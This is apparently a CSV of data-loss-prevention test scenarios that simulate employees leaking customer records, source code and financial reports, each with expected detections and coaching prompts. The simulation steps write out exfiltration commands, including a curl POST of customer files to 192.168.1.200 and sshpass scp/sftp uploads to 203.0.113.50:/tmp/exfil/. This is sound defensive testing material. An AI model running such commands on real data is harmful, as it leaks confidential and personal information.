"id","name","description","platform","attack_type","mitre_technique_id","mitre_technique_name","complexity","simulation_steps","expected_detections","tags","category","sub_category","risk_level","deploy_surfaces","coach_intervention","success_metric","priority","test_data","target_roles","third_party_systems"
"COACH-013","Print doc with PII, financial data, or source code to physical/virtual printer","Sends customer list or financial report to office printer. No digital trace remains","linux","exfiltration","T1091","Replication Through Removable Media — adjacent","medium","[{""order"": 1, ""role"": ""cli"", ""description"": ""Send the customer records file to the CUPS-PDF virtual printer"", ""command"": ""lp -d PDF /home/user/fixtures/customer_records.csv"", ""expected_artifact"": ""print_job_submitted_for_customer_records.csv"", ""timeout_seconds"": 20}, {""order"": 2, ""role"": ""cli"", ""description"": ""Send the financial report to the CUPS-PDF virtual printer"", ""command"": ""lp -d PDF /home/user/fixtures/q3_revenue.xlsx"", ""expected_artifact"": ""print_job_submitted_for_q3_revenue.xlsx"", ""timeout_seconds"": 20}, {""order"": 3, ""role"": ""cli"", ""description"": ""List the printed output files to confirm they were generated"", ""command"": ""ls -la /home/user/PDF/"", ""expected_artifact"": ""print_output_files_exist_in_pdf_directory"", ""timeout_seconds"": 15}]","[""print_job_contains_pii"", ""print_job_contains_financial_data"", ""sensitive_file_sent_to_printer""]","[""exfil_vectors"", ""print_sensitive_document"", ""P1"", ""desktop_agent""]","exfil_vectors","print_sensitive_document","high","[""desktop_agent""]","At print: 'Doc contains 200 customer records. Print audit logged. Continue or export redacted?'","≥85% sensitive content detection in print jobs, audit log captures doc + classification + user","P1","Test docs: (a) customer list PII, (b) financial report, (c) generic meeting notes. Virtual PDF printer","[""All roles""]","[""Virtual PDF printer (CutePDF/CUPS-PDF)""]"
"COACH-014","Copy corporate files to USB drive, external hard drive, or SD card","Drags corporate files to USB for 'backup'; includes customer data, source code","linux","exfiltration","T1052.001","Exfil Over Physical Medium: USB","high","[{""order"": 1, ""role"": ""cli"", ""description"": ""Copy the customer records file to the simulated USB mount"", ""command"": ""cp /home/user/fixtures/customer_records.csv /media/usb0/"", ""expected_artifact"": ""file_copy_customer_records.csv_to_removable_media"", ""timeout_seconds"": 15}, {""order"": 2, ""role"": ""cli"", ""description"": ""Copy the proprietary source code to the simulated USB mount"", ""command"": ""cp /home/user/fixtures/proprietary_code.py /media/usb0/"", ""expected_artifact"": ""file_copy_proprietary_code.py_to_removable_media"", ""timeout_seconds"": 15}, {""order"": 3, ""role"": ""cli"", ""description"": ""Copy the financial report to the simulated USB mount"", ""command"": ""cp /home/user/fixtures/q3_revenue.xlsx /media/usb0/"", ""expected_artifact"": ""file_copy_q3_revenue.xlsx_to_removable_media"", ""timeout_seconds"": 15}, {""order"": 4, ""role"": ""cli"", ""description"": ""List the USB mount directory to confirm all files are present"", ""command"": ""ls -la /media/usb0/"", ""expected_artifact"": ""removable_media_contains_sensitive_files"", ""timeout_seconds"": 10}]","[""file_copy_to_removable_media"", ""sensitive_file_written_to_usb_mount"", ""pii_file_on_removable_media"", ""proprietary_code_on_removable_media""]","[""exfil_vectors"", ""transfer_files_to_usb"", ""P1"", ""desktop_agent""]","exfil_vectors","transfer_files_to_usb","critical","[""desktop_agent""]","At copy to removable: 'Copying 15 files to USB. 3 contain customer data. Block sensitive, allow rest?'","≥95% file copy to removable detected, per-file sensitivity classification works","P1","Files: customer_db.xlsx (PII), source.py (proprietary), notes.txt (clean), photo.jpg (personal). USB drive","[""All roles""]","[""USB flash drive""]"
"COACH-015","AirDrop/Bluetooth corporate files to personal device","AirDrops customer report to phone, Bluetooth transfers code to personal laptop","linux","exfiltration","T1011.001","Exfil Over Other Network Medium: Bluetooth","medium","[{""order"": 1, ""role"": ""cli"", ""description"": ""Start a simple HTTP file server to simulate wireless file sharing"", ""command"": ""python3 -m http.server 8888 --directory /home/user/fixtures/ &"", ""expected_artifact"": ""http_file_server_started_on_port_8888"", ""timeout_seconds"": 10}, {""order"": 2, ""role"": ""cli"", ""description"": ""Use curl to simulate sending the customer records file to a personal device IP"", ""command"": ""curl -X POST -F 'file=@/home/user/fixtures/customer_records.csv' http://192.168.1.200:8888/upload"", ""expected_artifact"": ""http_post_file_to_personal_device_ip"", ""timeout_seconds"": 20}, {""order"": 3, ""role"": ""cli"", ""description"": ""Use curl to simulate sending the financial report to the personal device"", ""command"": ""curl -X POST -F 'file=@/home/user/fixtures/q3_revenue.xlsx' http://192.168.1.200:8888/upload"", ""expected_artifact"": ""http_post_file_to_personal_device_ip"", ""timeout_seconds"": 20}]","[""file_transfer_to_personal_device_ip"", ""sensitive_file_shared_via_http_to_non_corporate_ip"", ""pii_file_sent_to_external_endpoint""]","[""exfil_vectors"", ""transfer_via_bluetooth/airdrop"", ""P2"", ""desktop_agent""]","exfil_vectors","transfer_via_bluetooth/airdrop","high","[""desktop_agent""]","At wireless transfer: 'Sending corporate file via AirDrop. Use approved sharing instead?'","≥90% wireless file transfer detection, content classification applied","P2","macOS + second Apple device. Sensitive XLSX + generic PDF","[""All roles""]","[""Two devices with BT/AirDrop""]"
"COACH-016","Copy corporate data from internal app → paste into unauthorized external app","Copies customer list from Salesforce, pastes into personal Google Sheet","linux","collection","T1115","Clipboard Data","medium","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://salesforce.com to view the mock CRM page with customer data table"", ""ui_instructions"": ""Open Firefox. Type http://salesforce.com in the address bar and press Enter. Wait for the mock CRM page to load showing a table of customer records."", ""expected_artifact"": ""browser_navigated_to_salesforce.com"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Select the entire customer data table and copy it to clipboard"", ""ui_instructions"": ""Click at the start of the customer data table. Press Ctrl+A to select all content on the page, or manually drag to select the table rows containing customer names, emails, and phone numbers. Press Ctrl+C to copy the selected data to clipboard."", ""expected_artifact"": ""clipboard_contains_crm_customer_data"", ""timeout_seconds"": 20}, {""order"": 3, ""role"": ""ui"", ""description"": ""Open a new tab and navigate to http://sheets.google.com (personal account)"", ""ui_instructions"": ""Press Ctrl+T to open a new tab. Type http://sheets.google.com in the address bar and press Enter. Wait for Google Sheets to load."", ""expected_artifact"": ""browser_navigated_to_sheets.google.com"", ""timeout_seconds"": 20}, {""order"": 4, ""role"": ""ui"", ""description"": ""Click on cell A1 in the spreadsheet and paste the copied customer data"", ""ui_instructions"": ""Click on cell A1 in the empty spreadsheet. Press Ctrl+V to paste the customer data from the CRM. The data should populate the spreadsheet rows with customer names, emails, and phone numbers."", ""expected_artifact"": ""clipboard_paste_crm_data_into_personal_google_sheets"", ""timeout_seconds"": 20}]","[""clipboard_cross_app_paste_internal_to_external"", ""pii_copied_from_crm_to_personal_spreadsheet"", ""customer_data_pasted_into_non_corporate_app"", ""data_exfil_via_clipboard_to_google_sheets""]","[""exfil_vectors"", ""clipboard_to_external_app"", ""P1"", ""browser_extension"", ""desktop_agent""]","exfil_vectors","clipboard_to_external_app","high","[""browser_extension"", ""desktop_agent""]","Monitor clipboard when destination is external. 'Pasting customer data into personal Sheets. Use corporate sharing?'","≥90% clipboard classification at copy, source/destination context detection","P1","Mock CRM page with customer data. External targets: personal Gmail, Google Sheets, Notepad","[""All roles""]","[""Salesforce (mock)"", ""Google Sheets (personal acct)""]"
"COACH-017","Sync or upload corporate files to personal Dropbox, iCloud, OneDrive, Google Drive","Installs personal Dropbox, or uploads corporate docs to personal cloud account","linux","exfiltration","T1567.002","Exfil to Cloud Storage","medium","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://drive.google.com and log in with a personal Gmail account"", ""ui_instructions"": ""Open Firefox. Type http://drive.google.com in the address bar and press Enter. If prompted, log in with the personal account (personal@gmail.com, not the corporate account)."", ""expected_artifact"": ""browser_navigated_to_drive.google.com_personal_account"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Click the '+ New' button and select 'File upload'"", ""ui_instructions"": ""Click the '+ New' button in the top-left corner of Google Drive. From the dropdown menu, click 'File upload'. A file picker dialog should appear."", ""expected_artifact"": ""google_drive_file_upload_dialog_opened"", ""timeout_seconds"": 15}, {""order"": 3, ""role"": ""ui"", ""description"": ""Select and upload /home/user/fixtures/customer_records.csv to personal Google Drive"", ""ui_instructions"": ""In the file picker, navigate to /home/user/fixtures/. Select customer_records.csv. Click Open. The file should begin uploading. Wait for the upload progress bar to complete."", ""expected_artifact"": ""file_upload_customer_records.csv_to_personal_google_drive"", ""timeout_seconds"": 30}, {""order"": 4, ""role"": ""ui"", ""description"": ""Upload a second file: /home/user/fixtures/q3_revenue.xlsx"", ""ui_instructions"": ""Click '+ New' again, then 'File upload'. Navigate to /home/user/fixtures/. Select q3_revenue.xlsx. Click Open and wait for the upload to complete."", ""expected_artifact"": ""file_upload_q3_revenue.xlsx_to_personal_google_drive"", ""timeout_seconds"": 30}]","[""file_upload_to_personal_cloud_storage"", ""corporate_file_uploaded_to_non_corporate_google_drive"", ""pii_file_uploaded_to_personal_account"", ""financial_data_uploaded_to_personal_cloud""]","[""exfil_vectors"", ""upload_to_personal_cloud"", ""P0"", ""browser_extension"", ""desktop_agent""]","exfil_vectors","upload_to_personal_cloud","high","[""browser_extension"", ""desktop_agent""]","Detect upload to non-corporate instance: 'Uploading to personal Google Drive. Use corporate drive?'","≥95% personal vs corporate instance distinction, upload blocked for personal","P0","Corporate files. Two Google accounts: corp@company.com + personal@gmail.com. Dropbox free. rclone binary for CLI testing","[""All roles""]","[""Personal Dropbox/Google Drive (free)""]"
"COACH-018","Forward corporate email or attach corporate files to personal Gmail/Yahoo","Forwards deal summary to personal email for 'working from home'","linux","exfiltration","T1048.002","Exfil Over Asymmetric Encrypted Protocol","medium","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://mail.google.com and log in with personal Gmail"", ""ui_instructions"": ""Open Firefox. Type http://mail.google.com in the address bar and press Enter. Log in with the personal Gmail account if prompted."", ""expected_artifact"": ""browser_navigated_to_mail.google.com_personal"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Click the Compose button to start a new email"", ""ui_instructions"": ""Click the 'Compose' button in the top-left area of Gmail. A new message compose window should appear at the bottom-right of the screen."", ""expected_artifact"": ""gmail_compose_window_opened"", ""timeout_seconds"": 15}, {""order"": 3, ""role"": ""ui"", ""description"": ""Fill in the To field with the personal email and attach /home/user/fixtures/customer_records.csv"", ""ui_instructions"": ""In the To field, type 'myname@personal-email.com'. In the Subject field, type 'Work backup'. Click the paperclip/attachment icon at the bottom of the compose window. Navigate to /home/user/fixtures/ and select customer_records.csv. Click Open. Wait for the attachment to upload."", ""expected_artifact"": ""email_attachment_customer_records.csv_to_personal_email"", ""timeout_seconds"": 30}, {""order"": 4, ""role"": ""ui"", ""description"": ""Click Send to email the corporate file to the personal address"", ""ui_instructions"": ""Click the blue 'Send' button in the compose window to send the email with the attached corporate file."", ""expected_artifact"": ""email_sent_to_personal_address_with_corporate_attachment"", ""timeout_seconds"": 15}]","[""corporate_file_attached_to_personal_webmail"", ""pii_file_sent_via_personal_email"", ""file_exfil_via_gmail_to_non_corporate_address"", ""email_with_sensitive_attachment_to_external_recipient""]","[""exfil_vectors"", ""send_to_personal_webmail"", ""P0"", ""browser_extension""]","exfil_vectors","send_to_personal_webmail","high","[""browser_extension""]","At compose: 'Attaching corporate file to personal Gmail. Use corporate email or approved share?'","≥95% personal webmail detection, file attachment intercepted before send","P0","Personal Gmail test account. Corporate files: customer_list.xlsx, q3_revenue.pdf","[""All roles""]","[""Personal Gmail (test)""]"
"COACH-019","Post corporate data, screenshots, or internal info on LinkedIn/Twitter/X","Shares internal dashboard screenshot or unreleased metrics on social media","linux","exfiltration","T1567","Exfil Over Web Service","medium","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://linkedin.com"", ""ui_instructions"": ""Open Firefox. Type http://linkedin.com in the address bar and press Enter. Wait for LinkedIn to load and log in if prompted."", ""expected_artifact"": ""browser_navigated_to_linkedin.com"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Click 'Start a post' at the top of the LinkedIn feed"", ""ui_instructions"": ""Locate the 'Start a post' text area at the top of the LinkedIn home feed. Click on it. A post creation dialog should appear."", ""expected_artifact"": ""linkedin_post_dialog_opened"", ""timeout_seconds"": 15}, {""order"": 3, ""role"": ""ui"", ""description"": ""Type a post that includes internal company metrics from /home/user/fixtures/q3_revenue.xlsx"", ""ui_instructions"": ""In the post text area, type: 'Excited to share our Q3 results! Revenue hit $847M, up 23% YoY. Acquisition of CompanyX pending at $500M valuation. #growth #fintech'. This text contains MNPI from the internal financial data."", ""expected_artifact"": ""linkedin_post_text_contains_mnpi"", ""timeout_seconds"": 20}, {""order"": 4, ""role"": ""ui"", ""description"": ""Click the Post button to publish the content"", ""ui_instructions"": ""Click the blue 'Post' button at the bottom-right of the dialog to publish the post containing internal financial metrics."", ""expected_artifact"": ""social_media_post_published_with_mnpi"", ""timeout_seconds"": 15}]","[""social_media_post_contains_financial_data"", ""mnpi_posted_to_public_social_media"", ""unreleased_revenue_figure_in_linkedin_post"", ""acquisition_target_disclosed_on_social_media""]","[""exfil_vectors"", ""upload_to_social_media"", ""P2"", ""browser_extension""]","exfil_vectors","upload_to_social_media","high","[""browser_extension""]","At upload: 'Post contains internal dashboard screenshot. Remove confidential data?'","≥80% internal content detection in uploads, <5% FP on personal content","P2","Screenshots: (a) internal Grafana with revenue, (b) Slack internal discussion, (c) vacation photo (pass)","[""Marketing"", ""All""]","[""LinkedIn/Twitter (test accounts)""]"
"COACH-020","Share corporate files/data via WhatsApp Web, Telegram, Discord","Sends customer data via WhatsApp to colleague, shares doc in personal Discord","linux","exfiltration","T1567","Exfil Over Web Service","medium","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://web.whatsapp.com"", ""ui_instructions"": ""Open Firefox. Type http://web.whatsapp.com in the address bar and press Enter. Wait for WhatsApp Web to load (or the QR code page)."", ""expected_artifact"": ""browser_navigated_to_web.whatsapp.com"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Open a chat conversation with a contact"", ""ui_instructions"": ""Click on an existing chat conversation in the left sidebar, or start a new chat by clicking the new chat icon and selecting a contact."", ""expected_artifact"": ""whatsapp_chat_opened"", ""timeout_seconds"": 15}, {""order"": 3, ""role"": ""ui"", ""description"": ""Click the attachment icon and upload /home/user/fixtures/customer_records.csv"", ""ui_instructions"": ""Click the paperclip/attachment icon in the message input area. Select 'Document' from the options. Navigate to /home/user/fixtures/ and select customer_records.csv. Click Open."", ""expected_artifact"": ""whatsapp_file_attachment_customer_records.csv"", ""timeout_seconds"": 20}, {""order"": 4, ""role"": ""ui"", ""description"": ""Click the Send button to send the corporate file via WhatsApp"", ""ui_instructions"": ""Click the green send button to transmit the attached file through WhatsApp to the contact."", ""expected_artifact"": ""file_sent_via_whatsapp_web"", ""timeout_seconds"": 15}]","[""file_upload_to_unauthorized_chat_app"", ""corporate_file_sent_via_whatsapp"", ""pii_file_shared_through_personal_messaging_app"", ""data_exfil_via_whatsapp_web""]","[""exfil_vectors"", ""send_via_public_chat_apps"", ""P1"", ""browser_extension""]","exfil_vectors","send_via_public_chat_apps","high","[""browser_extension""]","At send: 'Sending corporate file via WhatsApp. Use Slack/Teams instead?'","≥95% file upload detection in chat, ≥85% sensitive text detection","P1","WhatsApp linked to test phone. Corporate XLSX + sensitive text. Personal content for FP testing","[""All roles""]","[""WhatsApp Web"", ""Telegram Web"", ""Discord (free)""]"
"COACH-021","Screen share in Zoom/Webex showing sensitive dashboards or data","Shares screen with Salesforce customer data visible; uploads file to meeting chat with externals","linux","collection","T1113","Screen Capture","low","[{""order"": 1, ""role"": ""ui"", ""description"": ""Open Firefox and navigate to http://salesforce.com to display the mock CRM page with customer PII"", ""ui_instructions"": ""Open Firefox. Type http://salesforce.com in the address bar and press Enter. Wait for the mock CRM page to load showing customer names, emails, and account balances."", ""expected_artifact"": ""browser_navigated_to_salesforce.com_with_pii_visible"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""ui"", ""description"": ""Open the Zoom application and start or join a meeting"", ""ui_instructions"": ""Open the Zoom application from the application menu. Click 'New Meeting' to start a meeting, or join an existing meeting using a meeting ID."", ""expected_artifact"": ""zoom_meeting_started"", ""timeout_seconds"": 30}, {""order"": 3, ""role"": ""ui"", ""description"": ""Click Share Screen and select the Firefox window showing customer data"", ""ui_instructions"": ""In the Zoom meeting toolbar at the bottom, click 'Share Screen'. In the window picker, select the Firefox window that is showing the Salesforce page with customer data. Click 'Share'."", ""expected_artifact"": ""screen_share_started_with_sensitive_window"", ""timeout_seconds"": 20}, {""order"": 4, ""role"": ""ui"", ""description"": ""Upload /home/user/fixtures/customer_records.csv to the Zoom meeting chat"", ""ui_instructions"": ""While screen sharing, click the Chat icon in the Zoom toolbar. Click the file attachment icon in the chat input. Navigate to /home/user/fixtures/ and select customer_records.csv. Send it to the meeting chat."", ""expected_artifact"": ""file_uploaded_to_zoom_meeting_chat"", ""timeout_seconds"": 20}]","[""screen_share_with_pii_visible"", ""sensitive_crm_data_visible_during_screen_share"", ""file_uploaded_to_external_meeting_chat"", ""customer_data_exposed_via_screen_share""]","[""exfil_vectors"", ""share_screen_with_sensitive_data_visible"", ""P2"", ""desktop_agent"", ""browser_extension""]","exfil_vectors","share_screen_with_sensitive_data_visible","medium","[""desktop_agent"", ""browser_extension""]","At screen share: 'Salesforce with customer data visible. Close before sharing?'","≥80% sensitive window detection at share time, file upload to external meeting detected","P2","Zoom free account. Mock Salesforce page with PII. Mock financial dashboard. Clean desktop","[""All roles""]","[""Zoom/Webex/Teams (free tier)""]"
"COACH-022","FTP/SFTP/SCP corporate files to personal or unauthorized server","SCPs database backup to personal VPS, or FTPs customer export to non-corp server","linux","exfiltration","T1048.003","Exfil Over Unencrypted Protocol","high","[{""order"": 1, ""role"": ""cli"", ""description"": ""SCP the customer records file to an external unauthorized server"", ""command"": ""sshpass -p test scp /home/user/fixtures/customer_records.csv user@203.0.113.50:/tmp/exfil/"", ""expected_artifact"": ""scp_connection_to_external_ip_203.0.113.50"", ""timeout_seconds"": 30}, {""order"": 2, ""role"": ""cli"", ""description"": ""SCP the proprietary code to the same external server"", ""command"": ""sshpass -p test scp /home/user/fixtures/proprietary_code.py user@203.0.113.50:/tmp/exfil/"", ""expected_artifact"": ""scp_connection_to_external_ip_with_proprietary_code"", ""timeout_seconds"": 30}, {""order"": 3, ""role"": ""cli"", ""description"": ""Use sftp to transfer the financial data to the external server"", ""command"": ""echo 'put /home/user/fixtures/q3_revenue.xlsx /tmp/exfil/' | sshpass -p test sftp user@203.0.113.50"", ""expected_artifact"": ""sftp_upload_to_external_ip"", ""timeout_seconds"": 30}]","[""scp_transfer_to_unapproved_external_ip"", ""sftp_transfer_to_unapproved_external_ip"", ""sensitive_file_exfil_via_ssh_protocol"", ""destination_ip_not_in_approved_list""]","[""exfil_vectors"", ""transfer_via_ftp/sftp/scp"", ""P2"", ""desktop_agent""]","exfil_vectors","transfer_via_ftp/sftp/scp","critical","[""desktop_agent""]","At CLI transfer: 'Transferring customer_backup.sql to external IP. Not in approved destinations. Block?'","≥90% FTP/SFTP/SCP detection, destination validation against approved list","P2","Docker SFTP image. Sensitive test file. Approved destination JSON. Public test server IP","[""Developer"", ""IT Admin""]","[""Docker SFTP server (atmoz/sftp) or local SSH""]"
